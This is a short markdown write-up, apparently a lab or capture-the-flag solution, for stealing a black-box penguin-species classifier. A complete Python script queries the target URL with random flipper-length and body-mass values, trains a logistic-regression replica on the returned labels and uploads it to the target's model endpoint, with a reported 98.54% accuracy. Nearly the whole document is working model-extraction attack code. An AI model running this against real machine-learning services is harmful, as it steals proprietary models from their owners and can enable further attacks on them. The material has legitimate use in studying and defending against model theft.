# Model Reverse Engineering

Steal a black-box classifier by querying it with random inputs and training a local replica.

## Script

```python
import random, pandas as pd, requests, json
from sklearn.pipeline import make_pipeline
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
import joblib

CLASSIFIER_URL = "http://TARGET/"
N_SAMPLES = 100

samples = {"Flipper Length (mm)": [], "Body Mass (g)": []}
for i in range(N_SAMPLES):
    samples["Flipper Length (mm)"].append(random.uniform(150, 250))
    samples["Body Mass (g)"].append(random.uniform(2500, 6500))

samples_df = pd.DataFrame(samples)
predictions = {"species": []}
for i in range(N_SAMPLES):
    sample = {"flipper_length": samples["Flipper Length (mm)"][i], "body_mass": samples["Body Mass (g)"][i]}
    prediction = json.loads(requests.get(CLASSIFIER_URL, params=sample).text).get("result")
    predictions["species"].append(prediction)

predictions_df = pd.DataFrame(predictions)
stolen_model = make_pipeline(StandardScaler(), LogisticRegression())
stolen_model.fit(samples_df, predictions_df.values.ravel())
joblib.dump(stolen_model, 'student.joblib')

with open('student.joblib', 'rb') as f:
    file = f.read()
r = requests.post(CLASSIFIER_URL + 'model', files={'file': ('student.joblib', file)})
print(r.json())
```

Result: 98.54% accuracy on stolen model.
